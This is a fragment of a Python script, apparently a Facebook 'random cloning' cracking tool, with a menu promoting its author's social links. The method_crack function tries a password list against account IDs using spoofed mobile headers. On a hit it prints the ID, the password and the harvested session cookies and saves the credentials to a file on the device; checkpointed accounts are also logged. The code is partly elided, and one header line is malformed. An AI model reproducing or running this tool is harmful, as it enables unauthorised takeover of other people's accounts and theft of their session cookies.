...
def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/SHIPU999')
    print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
    print(f'{B} [{warna}02{B}] \33[0;41mFOLLOW MY FB ID\033[0;92m ')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/shipukhan72');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801797970064');time.sleep(1)
    else:
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            header= {''Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','viewport-width': '980','}
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[SHIPU-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/SHIPU-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[SHIPU-CP] '+ids+' | '+pas+'\033[1;37m')
